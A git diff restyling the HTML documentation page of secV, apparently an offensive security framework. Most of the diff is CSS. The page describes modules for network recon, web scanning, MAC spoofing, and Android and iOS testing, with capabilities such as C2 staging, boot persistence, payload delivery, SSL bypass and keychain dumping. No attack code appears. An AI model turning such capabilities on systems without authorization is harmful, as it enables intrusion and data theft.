+  flex-wrap: wrap;
+}
+.banner-meta span { display: flex; align-items: center; gap: 0.35rem; }
+
+/* ─── MODULE GRID ─── */
+.module-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+.module-card {
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-radius: var(--r);
+  padding: 1.75rem;
+  position: relative;
+  text-decoration: none;
+  display: block;
+  transition: border-color var(--t), transform 0.25s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.25s;
+  overflow: hidden;
+}
+.module-card::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(115deg, transparent 40%, rgba(255,255,255,0.03) 50%, transparent 60%);
+  transform: translateX(-100%);
+  transition: transform 0.5s ease;
+  pointer-events: none;
+}
+.module-card:hover { border-color: var(--ash); transform: translateY(-4px); box-shadow: 0 16px 40px rgba(0,0,0,0.5); }
+.module-card:hover::before { transform: translateX(100%); }
+.module-card.wip { opacity: 0.65; }
+
+.mod-status {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  font-size: 0.44rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  padding: 0.12rem 0.55rem;
+  border: 1px solid var(--wall);
+  border-radius: 999px;
+  margin-bottom: 1rem;
+}
+.mod-status::before {
+  content: '';
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  background: currentColor;
+  flex-shrink: 0;
+}
+.status-stable { color: var(--ash); border-color: var(--stone); }
+.status-beta   { color: var(--fog); border-color: var(--crack); }
+.status-wip    { color: var(--dust); border-color: var(--wall); }
+
+.mod-name {
+  font-family: var(--disp);
+  font-size: 1.35rem;
+  letter-spacing: 0.03em;
+  color: var(--white);
+  margin-bottom: 0.2rem;
+}
+.mod-category {
+  font-size: 0.5rem;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--dust);
+  margin-bottom: 0.85rem;
+}
+.mod-desc { font-size: 0.7rem; color: var(--fog); line-height: 1.75; margin-bottom: 1.25rem; }
+.mod-tags { display: flex; flex-wrap: wrap; gap: 0.3rem; }
+.tag {
+  font-size: 0.44rem;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: var(--dust);
+  padding: 0.12rem 0.45rem;
+  border: 1px solid var(--wall);
+  border-radius: 3px;
+  transition: border-color var(--t), color var(--t);
+}
+.module-card:hover .tag { border-color: var(--stone); color: var(--ash); }
+.mod-arrow {
+  position: absolute;
+  right: 1.25rem; bottom: 1.25rem;
+  font-size: 0.9rem;
+  color: var(--dust);
+  opacity: 0;
+  transition: opacity 0.15s, transform 0.15s;
+}
+.module-card:hover .mod-arrow { opacity: 1; transform: translateX(4px); }
+
+/* ─── BODY TEXT ─── */
+.body-text {
+  font-size: 0.74rem;
+  color: var(--fog);
+  line-height: 1.9;
+  margin-bottom: 1.5rem;
+  max-width: 760px;
+}
+.body-text a { color: var(--ash); border-bottom: 1px solid var(--stone); text-decoration: none; transition: color var(--t); }
+.body-text a:hover { color: var(--white); }
+.body-text code { font-family: var(--mono); font-size: 0.68rem; color: var(--ash); background: var(--slab); border: 1px solid var(--wall); padding: 0.05rem 0.3rem; border-radius: 3px; }
+
+/* ─── ARCH FLOW ─── */
+.arch-flow {
+  display: flex;
+  align-items: stretch;
+  border: var(--bw) solid var(--wall);
+  border-radius: var(--r);
+  overflow: hidden;
+  margin: 2rem 0;
+  background: var(--slab);
+  flex-wrap: wrap;
+}
+.arch-node {
+  flex: 1;
+  min-width: 120px;
+  padding: 1.25rem 1.2rem;
+  border-right: 1px solid var(--wall);
+  text-align: center;
+  transition: background var(--t), transform 0.2s cubic-bezier(0.34,1.4,0.64,1);
+  position: relative;
+  z-index: 0;
+}
+.arch-node:last-child { border-right: none; }
+.arch-node:hover { background: var(--pit); transform: scale(1.04); z-index: 2; }
+.arch-node-label {
+  font-size: 0.42rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dust);
+  margin-bottom: 0.4rem;
+}
+.arch-node-name {
+  font-family: var(--disp);
+  font-size: 0.95rem;
+  letter-spacing: 0.04em;
+  color: var(--white);
+  margin-bottom: 0.3rem;
+}
+.arch-node-detail { font-size: 0.56rem; color: var(--dust); line-height: 1.65; }
+.arch-arrow {
+  display: flex;
+  align-items: center;
+  padding: 0 0.1rem;
+  color: var(--stone);
+  font-size: 0.85rem;
+  flex-shrink: 0;
 }
 
-/* step number count-up feel on hover */
-.step-num {
-  transition: color 0.2s;
+/* ─── INFO GRID ─── */
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+  gap: 0.75rem;
+  margin: 1.5rem 0 2.5rem;
 }
-.step:hover .step-num { color: var(--grey); }
+.info-card {
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-radius: var(--r);
+  padding: 1.4rem;
+  transition: border-color var(--t), transform 0.22s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.22s;
+}
+.info-card:hover {
+  border-color: var(--stone);
+  transform: translateY(-3px);
+  box-shadow: 0 10px 28px rgba(0,0,0,0.45);
+}
+.info-card-num {
+  font-family: var(--disp);
+  font-size: 2rem;
+  color: var(--crack);
+  letter-spacing: -0.02em;
+  margin-bottom: 0.5rem;
+  transition: color var(--t);
+}
+.info-card:hover .info-card-num { color: var(--stone); }
+.info-card-title { font-size: 0.68rem; font-weight: 700; color: var(--ash); margin-bottom: 0.4rem; }
+.info-card-body { font-size: 0.62rem; color: var(--dust); line-height: 1.7; }
+.info-card-body code { font-family: var(--mono); font-size: 0.58rem; color: var(--ash); background: var(--pit); border: 1px solid var(--wall); padding: 0.02rem 0.25rem; border-radius: 3px; }
 
-/* chain step slide */
+/* ─── PRE / CODE ─── */
+pre {
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-left: 3px solid var(--stone);
+  border-radius: 0 var(--r-sm) var(--r-sm) 0;
+  padding: 1.25rem 1.4rem;
+  font-size: 0.7rem;
+  overflow-x: auto;
+  color: var(--fog);
+  margin: 0.75rem 0 1.5rem;
+  line-height: 1.8;
+}
+code { font-family: var(--mono); }
+.hl { color: var(--white); }
+.cm { color: var(--dust); font-style: italic; }
+.kw { color: var(--ash); }
+.st { color: var(--fog); }
+.nu { color: var(--ash); }
+
+/* ─── CALLOUT ─── */
+.callout {
+  border: var(--bw) solid var(--wall);
+  border-left: 3px solid var(--ash);
+  background: var(--slab);
+  border-radius: 0 var(--r-sm) var(--r-sm) 0;
+  padding: 1rem 1.25rem;
+  font-size: 0.7rem;
+  color: var(--fog);
+  line-height: 1.85;
+  margin: 1.25rem 0 2rem;
+}
+.callout strong { color: var(--white); }
+.callout.warn { border-left-color: var(--stone); }
+
+/* ─── CHAIN ─── */
+.chain {
+  border: var(--bw) solid var(--wall);
+  border-radius: var(--r);
+  overflow: hidden;
+  margin: 1.5rem 0 2rem;
+}
 .chain-step {
-  transition: background 0.18s, padding-left 0.2s;
+  display: grid;
+  grid-template-columns: 2.75rem 1fr;
+  gap: 1rem;
+  padding: 1.1rem 1.25rem;
+  border-bottom: 1px solid var(--wall);
+  align-items: start;
+  background: var(--black);
+  transition: background var(--t), padding-left 0.2s;
 }
-.chain-step:hover { padding-left: 1.6rem; }
+.chain-step:last-child { border-bottom: none; }
+.chain-step:hover { background: var(--deep); padding-left: 1.5rem; }
+.chain-num {
+  font-family: var(--disp);
+  font-size: 0.85rem;
+  color: var(--stone);
+  letter-spacing: 0.04em;
+  padding-top: 0.1rem;
+  transition: color var(--t);
+}
+.chain-step:hover .chain-num { color: var(--ash); }
+.chain-content-title { font-size: 0.72rem; font-weight: 700; color: var(--ash); margin-bottom: 0.3rem; }
+.chain-content-body { font-size: 0.65rem; color: var(--dust); line-height: 1.7; }
+.chain-content-code { font-family: var(--mono); font-size: 0.6rem; color: var(--ash); background: var(--slab); border: 1px solid var(--wall); padding: 0.02rem 0.28rem; border-radius: 3px; }
 
-/* ── Responsive ── */
-@media (max-width: 760px) {
-  nav { padding: 0 1.25rem; }
+/* ─── TWO-COL ─── */
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1rem;
+  margin: 1.5rem 0 2rem;
+}
+.col-card {
+  background: var(--slab);
+  border: var(--bw) solid var(--wall);
+  border-radius: var(--r);
+  padding: 1.4rem;
+  transition: border-color var(--t), transform 0.22s cubic-bezier(0.34,1.4,0.64,1), box-shadow 0.22s;
+}
+.col-card:hover {
+  border-color: var(--stone);
+  transform: translateY(-3px);
+  box-shadow: 0 10px 28px rgba(0,0,0,0.45);
+}
+.col-card-title {
+  font-size: 0.52rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--dust);
+  margin-bottom: 0.8rem;
+  padding-bottom: 0.6rem;
+  border-bottom: 1px solid var(--wall);
+}
+.col-card-body { font-size: 0.66rem; color: var(--fog); line-height: 1.8; }
+
+/* ─── CMD TABLE ─── */
+.shell-section {
+  margin-bottom: 4rem;
+}
+.shell-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.25rem;
+  padding-bottom: 1rem;
+  border-bottom: var(--bw) solid var(--wall);
+}
+.shell-title {
+  font-family: var(--disp);
+  font-size: 1.3rem;
+  letter-spacing: 0.04em;
+  color: var(--white);
+}
+.shell-version {
+  font-size: 0.44rem;
+  letter-spacing: 0.18em;
+  text-transform: uppercase;
+  color: var(--dust);
+  border: 1px solid var(--wall);
+  padding: 0.12rem 0.5rem;
+  border-radius: 3px;
+}
+
+.cmd-table { width: 100%; border-collapse: collapse; }
+.cmd-table tr { border-bottom: 1px solid var(--wall); }
+.cmd-table tr:last-child { border-bottom: none; }
+.cmd-table td { padding: 0.7rem 0.85rem; font-size: 0.68rem; vertical-align: top; line-height: 1.65; }
+.cmd-table td:first-child { color: var(--white); white-space: nowrap; width: 38%; }
+.cmd-table td:last-child { color: var(--dust); }
+.cmd-group-header td {
+  font-size: 0.44rem;
+  letter-spacing: 0.22em;
+  text-transform: uppercase;
+  color: var(--stone);
+  padding-top: 1.4rem;
+  padding-bottom: 0.4rem;
+  border-bottom: none;
+}
+.cmd-table tr:hover td { background: var(--deep); }
+.cmd-table .cmd-group-header:hover td { background: transparent; }
+.cmd-table code { font-family: var(--mono); font-size: 0.62rem; color: var(--ash); background: var(--slab); border: 1px solid var(--wall); padding: 0.03rem 0.28rem; border-radius: 3px; }
+
+/* ─── QUICKSTART STEPS ─── */
+.steps { display: flex; flex-direction: column; }
+.step {
+  display: grid;
+  grid-template-columns: 3.5rem 1fr;
+  gap: 1.5rem;
+  padding: 1.75rem 0;
+  border-bottom: 1px solid var(--wall);
+  align-items: start;
+}
+.step:last-child { border-bottom: none; }
+.step-num {
+  font-family: var(--disp);
+  font-size: 2rem;
+  color: var(--wall);
+  line-height: 1;
+  letter-spacing: -0.02em;
+  transition: color var(--t);
+}
+.step:hover .step-num { color: var(--stone); }
+.step-title { font-size: 0.82rem; font-weight: 700; color: var(--white); margin-bottom: 0.4rem; }
+.step-body { font-size: 0.7rem; color: var(--fog); line-height: 1.75; margin-bottom: 0.75rem; }
+.step-body code { font-family: var(--mono); font-size: 0.64rem; color: var(--ash); background: var(--slab); border: 1px solid var(--wall); padding: 0.04rem 0.28rem; border-radius: 3px; }
+
+/* ─── PARAM TABLE ─── */
+.param-table { width: 100%; border-collapse: collapse; margin: 1rem 0 2rem; }
+.param-table th {
+  font-size: 0.42rem;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--dust);
+  padding: 0.5rem 0.8rem;
+  text-align: left;
+  border-bottom: 1px solid var(--stone);
+  font-weight: 400;
+}
+.param-table td { padding: 0.65rem 0.8rem; font-size: 0.68rem; vertical-align: top; border-bottom: 1px solid var(--wall); line-height: 1.6; }
+.param-table td:first-child { color: var(--white); font-family: var(--mono); }
+.param-table td:nth-child(2) { color: var(--stone); font-size: 0.62rem; }
+.param-table td:last-child { color: var(--fog); }
+.param-table tr:last-child td { border-bottom: none; }
+.param-table tr:hover td { background: var(--deep); }
+
+/* ─── FOOTER ─── */
+footer {
+  position: relative;
+  z-index: 1;
+  border-top: var(--bw) solid var(--ash);
+  background: var(--black);
+}
+.foot-inner {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 1.5rem 2.5rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+.foot-brand {
+  font-family: var(--disp);
+  font-size: 1.3rem;
+  letter-spacing: 0.08em;
+  color: var(--white);
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.foot-brand::before {
+  content: '';
+  width: 7px; height: 7px;
+  background: var(--white);
+  transform: rotate(45deg);
+}
+.foot-links { display: flex; gap: 0; }
+.foot-link {
+  font-size: 0.48rem;
+  letter-spacing: 0.16em;
+  text-transform: uppercase;
+  color: var(--dust);
+  text-decoration: none;
+  padding: 0.4rem 0.85rem;
+  border-right: 1px solid var(--wall);
+  transition: color var(--t), background var(--t);
+}
+.foot-link:first-child { border-left: 1px solid var(--wall); }
+.foot-link:hover { color: var(--ash); background: rgba(255,255,255,0.03); }
+.foot-note { font-size: 0.44rem; color: var(--stone); letter-spacing: 0.1em; text-transform: uppercase; }
+
+/* ─── SCROLL REVEAL ─── */
+.reveal {
+  opacity: 0;
+  transform: translateY(16px);
+  transition: opacity 0.5s ease, transform 0.5s ease;
+}
+.reveal.in-view { opacity: 1; transform: none; }
+
+/* ─── RESPONSIVE ─── */
+@media (max-width: 860px) {
+  nav { padding: 0 1.25rem; width: calc(100% - 2rem); }
   .nav-link { display: none; }
   .burger { display: flex; }
   body.nav-open .nav-links {
     display: flex;
     position: fixed;
-    top: 52px; left: 0; right: 0;
-    background: var(--bg);
-    border-bottom: 1px solid var(--border);
+    top: 76px; left: 1rem; right: 1rem;
+    background: var(--slab);
+    border: var(--bw) solid var(--wall);
+    border-radius: var(--r);
     flex-direction: column;
-    padding: 1rem 1.5rem 1.5rem;
+    padding: 1rem 1.25rem 1.25rem;
     gap: 0.25rem;
-    z-index: 99;
+    z-index: 499;
   }
-  .hero { padding: 7.5rem 1.25rem 4rem; }
-  h1 { font-size: 2.4rem; }
-  .wrap { padding: 3rem 1.25rem 4rem; }
-  footer { padding: 1.25rem; }
+  .hero { padding: 8rem 1.5rem 4rem; }
+  h1 { font-size: 5rem; }
+  .wrap { padding: 3.5rem 1.5rem; }
+  .two-col { grid-template-columns: 1fr; }
   .module-grid { grid-template-columns: 1fr; }
-  .project-banner { flex-direction: column; align-items: flex-start; }
   .arch-flow { flex-direction: column; }
-  .arch-node { border-right: none; border-bottom: 1px solid var(--border); }
+  .arch-node { border-right: none; border-bottom: 1px solid var(--wall); }
   .arch-node:last-child { border-bottom: none; }
+  .arch-arrow { display: none; }
+  .project-banner { flex-direction: column; align-items: flex-start; }
+}
+@media (max-width: 540px) {
+  h1 { font-size: 3.8rem; }
+  h2 { font-size: 2.8rem; }
+  .step { grid-template-columns: 2.5rem 1fr; }
 }
 </style>
 </head>
 <body>
 
+<!-- NAV -->
 <nav id="nav">
   <a class="logo" href="../../index.html">
-    SecVulnHub <span class="logo-sep">/</span> <span class="logo-sub">docs</span>
+    <span class="logo-sq"></span>
+    SECVULNHUB
+    <span class="logo-sep">/</span>
+    <span class="logo-sub">DOCS</span>
   </a>
-  <div class="nav-links">
+  <div class="nav-links" id="navLinks">
     <a class="nav-link" href="#modules">Modules</a>
     <a class="nav-link" href="#architecture">Architecture</a>
     <a class="nav-link" href="#internals">Internals</a>
     <a class="nav-link" href="#shell">Shell</a>
     <a class="nav-link" href="#c2stack">C2 Stack</a>
     <a class="nav-link" href="#quickstart">Quickstart</a>
-    <a class="nav-btn" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+    <a class="nav-cta" href="https://github.com/secvulnhub" target="_blank">GitHub →</a>
   </div>
-  <button class="burger" id="burger" aria-label="Toggle menu">
-    <span></span><span></span><span></span>
-  </button>
+  <button class="burger" id="burger"><span></span><span></span><span></span></button>
 </nav>
 
-<!-- Hero -->
+<!-- HERO -->
 <div class="hero">
   <div class="breadcrumb">
     <a href="../../index.html">SecVulnHub</a>
-    <span>/</span>
+    <span class="breadcrumb-sep">/</span>
     Docs
-    <span>/</span>
+    <span class="breadcrumb-sep">/</span>
     secV
   </div>
-  <h1>secV<br><em>Documentation</em></h1>
-  <p class="hero-sub">
-    secV is a modular offensive security framework built around a Go REPL shell and
-    Python-driven modules. Each module is a self-contained tool that receives targets
-    and parameters over stdin and returns structured findings over stdout. The shell
-    handles dispatch, tab-completion, session tracking, and live module reloading.
-  </p>
+  <h1>secV<em>Documentation</em></h1>
+  <p class="hero-sub">secV is a modular offensive security framework built around a Go REPL shell and Python-driven modules. Each module is a self-contained tool that receives targets and parameters over stdin and returns structured findings over stdout. The shell handles dispatch, tab-completion, session tracking, and live module reloading.</p>
   <div class="install-block">
     <span class="install-label">Install</span>
     <span class="install-cmd" id="installCmd">git clone https://github.com/secvulnhub/secV && cd secV && bash install.sh</span>
@@ -892,199 +861,130 @@ footer {
 
 <hr class="rule">
 
-<!-- Modules -->
+<!-- MODULES -->
 <div class="wrap" id="modules">
-  <p class="section-label">Current Project</p>
-  <h2>secV Modules</h2>
+  <div class="section-label">
+    <span class="section-num">01</span>
+    <span>Current Project</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>secV <span class="h2-stroke">Modules</span></h2>
 
-  <div class="project-banner">
-    <div class="project-banner-left">
-      <div class="project-banner-dot"></div>
+  <div class="project-banner reveal">
+    <div class="banner-left">
+      <div class="banner-dot"></div>
       <div>
-        <div class="project-banner-label">Active development</div>
-        <div class="project-banner-name">secV Framework</div>
+        <div class="banner-tag">Active Development</div>
+        <div class="banner-name">secV Framework</div>
       </div>
     </div>
-    <div class="project-banner-meta">
+    <div class="banner-meta">
       <span>
-        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
         v2.5.0 · active
       </span>
       <span>
-        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+        <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
         secvulnhub/secV
       </span>
-      <span>
-        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
-        Go shell · Python modules · MIT
-      </span>
+      <span>Go shell · Python modules · MIT</span>
     </div>
   </div>
 
   <div class="module-grid">
-
-    <!-- netrecon -->
-    <a class="module-card" href="modules/netrecon.html">
+    <a class="module-card reveal" href="modules/netrecon.html">
       <span class="mod-status status-stable">Stable</span>
       <div class="mod-name">netrecon</div>
       <div class="mod-category">Network · Recon</div>
-      <div class="mod-desc">
-        Multi-engine network reconnaissance. Combines nmap, masscan, rustscan
-        with host profiling, CVE mapping, IoT device detection, MQTT/RTSP probing,
-        ICS/SCADA identification, and geolocation.
-      </div>
+      <div class="mod-desc">Multi-engine network reconnaissance. Combines nmap, masscan, rustscan with host profiling, CVE mapping, IoT device detection, MQTT/RTSP probing, ICS/SCADA identification, and geolocation.</div>
       <div class="mod-tags">
-        <span class="tag">nmap</span>
-        <span class="tag">masscan</span>
-        <span class="tag">rustscan</span>
-        <span class="tag">iot</span>
-        <span class="tag">cve</span>
-        <span class="tag">geo</span>
+        <span class="tag">nmap</span><span class="tag">masscan</span><span class="tag">rustscan</span><span class="tag">iot</span><span class="tag">cve</span><span class="tag">geo</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- android_pentest -->
-    <a class="module-card" href="modules/android_pentest.html">
+    <a class="module-card reveal" href="modules/android_pentest.html">
       <span class="mod-status status-stable">Stable</span>
       <div class="mod-name">android_pentest</div>
       <div class="mod-category">Mobile · Android</div>
-      <div class="mod-desc">
-        Full Android security testing suite - APK static analysis, smali patching,
-        boot persistence via Termux:Boot, WAN C2 with DexClassLoader staging,
-        Frida/Objection instrumentation, and QR-based payload delivery.
-      </div>
+      <div class="mod-desc">Full Android security testing suite — APK static analysis, smali patching, boot persistence via Termux:Boot, WAN C2 with DexClassLoader staging, Frida/Objection instrumentation, and QR-based payload delivery.</div>
       <div class="mod-tags">
-        <span class="tag">adb</span>
-        <span class="tag">apktool</span>
-        <span class="tag">dexclassloader</span>
-        <span class="tag">bore</span>
-        <span class="tag">frida</span>
-        <span class="tag">qr</span>
+        <span class="tag">adb</span><span class="tag">apktool</span><span class="tag">dexclassloader</span><span class="tag">bore</span><span class="tag">frida</span><span class="tag">qr</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- ios_pentest -->
-    <a class="module-card" href="modules/ios_pentest.html">
+    <a class="module-card reveal" href="modules/ios_pentest.html">
       <span class="mod-status status-beta">Beta</span>
       <div class="mod-name">ios_pentest</div>
       <div class="mod-category">Mobile · iOS</div>
-      <div class="mod-desc">
-        iOS security testing via libimobiledevice and Frida. IPA static analysis,
-        binary protection checks, ATS audit, SSL bypass, keychain dumping,
-        and live CVE assessment via NVD.
-      </div>
+      <div class="mod-desc">iOS security testing via libimobiledevice and Frida. IPA static analysis, binary protection checks, ATS audit, SSL bypass, keychain dumping, and live CVE assessment via NVD.</div>
       <div class="mod-tags">
-        <span class="tag">ideviceinfo</span>
-        <span class="tag">libimobiledevice</span>
-        <span class="tag">frida</span>
-        <span class="tag">ipa</span>
-        <span class="tag">cve</span>
+        <span class="tag">ideviceinfo</span><span class="tag">libimobiledevice</span><span class="tag">frida</span><span class="tag">ipa</span><span class="tag">cve</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- mac_spoof -->
-    <a class="module-card" href="modules/mac_spoof.html">
+    <a class="module-card reveal" href="modules/mac_spoof.html">
       <span class="mod-status status-stable">Stable</span>
       <div class="mod-name">mac_spoof</div>
       <div class="mod-category">Network · Anonymity</div>
-      <div class="mod-desc">
-        Per-interface MAC address rotation with active connection tracking.
-        Smart, session, periodic, and aggressive rotation modes.
-        Graceful DHCP renewal and state persistence.
-      </div>
+      <div class="mod-desc">Per-interface MAC address rotation with active connection tracking. Smart, session, periodic, and aggressive rotation modes. Graceful DHCP renewal and state persistence.</div>
       <div class="mod-tags">
-        <span class="tag">mac</span>
-        <span class="tag">spoofing</span>
-        <span class="tag">anonymity</span>
-        <span class="tag">network</span>
+        <span class="tag">mac</span><span class="tag">spoofing</span><span class="tag">anonymity</span><span class="tag">network</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- wifi_monitor -->
-    <a class="module-card" href="modules/wifi_monitor.html">
+    <a class="module-card reveal" href="modules/wifi_monitor.html">
       <span class="mod-status status-beta">Beta</span>
       <div class="mod-name">wifi_monitor</div>
       <div class="mod-category">Network · Wireless</div>
-      <div class="mod-desc">
-        Passive WiFi network monitor. Discovers hosts, fingerprints device types
-        (IoT cameras, routers, NAS, databases), detects exposed services, maps
-        CVEs, and exports structured JSON reports.
-      </div>
+      <div class="mod-desc">Passive WiFi network monitor. Discovers hosts, fingerprints device types (IoT cameras, routers, NAS, databases), detects exposed services, maps CVEs, and exports structured JSON reports.</div>
       <div class="mod-tags">
-        <span class="tag">wifi</span>
-        <span class="tag">arp</span>
-        <span class="tag">fingerprint</span>
-        <span class="tag">iot</span>
-        <span class="tag">cve</span>
-        <span class="tag">threat</span>
+        <span class="tag">wifi</span><span class="tag">arp</span><span class="tag">fingerprint</span><span class="tag">iot</span><span class="tag">cve</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- websec -->
-    <a class="module-card" href="modules/websec.html">
-      <span class="mod-status status-beta">beta</span>
+    <a class="module-card reveal" href="modules/websec.html">
+      <span class="mod-status status-beta">Beta</span>
       <div class="mod-name">websec</div>
       <div class="mod-category">Web · Security Research</div>
-      <div class="mod-desc">
-        Burp Suite-style terminal research tool. DNS/WHOIS/SSL OSINT, headers, CORS,
-        cookies, directory discovery, SQLi, XSS, spider, Google dorks, WAF detection,
-        and built-in OWASP knowledge base. Educational context at every step.
-      </div>
+      <div class="mod-desc">Burp Suite-style terminal research tool. DNS/WHOIS/SSL OSINT, headers, CORS, cookies, directory discovery, SQLi, XSS, spider, Google dorks, WAF detection, and built-in OWASP knowledge base.</div>
       <div class="mod-tags">
-        <span class="tag">osint</span>
-        <span class="tag">headers</span>
-        <span class="tag">cors</span>
-        <span class="tag">sqli</span>
-        <span class="tag">xss</span>
-        <span class="tag">waf</span>
+        <span class="tag">osint</span><span class="tag">headers</span><span class="tag">cors</span><span class="tag">sqli</span><span class="tag">xss</span><span class="tag">waf</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
 
-    <!-- webscan -->
-    <a class="module-card" href="modules/webscan.html">
-      <span class="mod-status status-stable">stable</span>
+    <a class="module-card reveal" href="modules/webscan.html">
+      <span class="mod-status status-stable">Stable</span>
       <div class="mod-name">webscan</div>
       <div class="mod-category">Web · Vulnerability</div>
-      <div class="mod-desc">
-        OWASP Top 10 scanner: error-based and time-based SQLi, reflected XSS,
-        CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, security headers,
-        file upload detection. Authenticated scanning via cookies.
-      </div>
+      <div class="mod-desc">OWASP Top 10 scanner: error-based and time-based SQLi, reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, security headers, file upload detection. Authenticated scanning via cookies.</div>
       <div class="mod-tags">
-        <span class="tag">sqli</span>
-        <span class="tag">xss</span>
-        <span class="tag">csrf</span>
-        <span class="tag">403bypass</span>
-        <span class="tag">cve</span>
+        <span class="tag">sqli</span><span class="tag">xss</span><span class="tag">csrf</span><span class="tag">403bypass</span><span class="tag">cve</span>
       </div>
       <span class="mod-arrow">→</span>
     </a>
-
   </div>
 </div>
 
 <hr class="rule">
 
-<!-- Architecture -->
+<!-- ARCHITECTURE -->
 <div class="wrap" id="architecture">
-  <p class="section-label">How It Works</p>
-  <h2>Architecture</h2>
+  <div class="section-label">
+    <span class="section-num">02</span>
+    <span>How It Works</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Archi<span class="h2-stroke">tecture</span></h2>
 
-  <p class="body-text">
-    secV is split into two layers: a <strong style="color:var(--white)">Go REPL shell</strong> that handles all user interaction,
-    and <strong style="color:var(--white)">Python (or Bash) modules</strong> that do the actual work. The shell never embeds
-    tool-specific logic - it only knows how to load modules, manage parameters, and route
-    stdin/stdout. This keeps the binary small (~4 MB) and makes adding new modules as simple
-    as dropping a Python file into the right directory.
-  </p>
+  <p class="body-text reveal">secV is split into two layers: a <strong style="color:var(--white)">Go REPL shell</strong> that handles all user interaction, and <strong style="color:var(--white)">Python (or Bash) modules</strong> that do the actual work. The shell never embeds tool-specific logic — it only knows how to load modules, manage parameters, and route stdin/stdout. This keeps the binary small (~4 MB) and makes adding new modules as simple as dropping a Python file into the right directory.</p>
 
-  <div class="arch-flow">
+  <div class="arch-flow reveal">
     <div class="arch-node">
       <div class="arch-node-label">User</div>
       <div class="arch-node-name">Terminal</div>
@@ -1117,59 +1017,31 @@ footer {
   </div>
 
   <div class="info-grid">
-    <div class="info-card">
+    <div class="info-card reveal">
       <div class="info-card-num">01</div>
       <div class="info-card-title">Module Discovery</div>
-      <div class="info-card-body">
-        At startup the shell walks <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">tools/</code>
-        and loads every <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">module.json</code>
-        it finds. Each JSON file declares the module's name, description, entry-point binary,
-        accepted parameters, and required dependencies. The shell never executes anything
-        until <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">run</code> is called.
-      </div>
+      <div class="info-card-body">At startup the shell walks <code>tools/</code> and loads every <code>module.json</code> it finds. Each JSON file declares the module's name, description, entry-point binary, accepted parameters, and required dependencies. The shell never executes anything until <code>run</code> is called.</div>
     </div>
-    <div class="info-card">
+    <div class="info-card reveal">
       <div class="info-card-num">02</div>
       <div class="info-card-title">Parameter Model</div>
-      <div class="info-card-body">
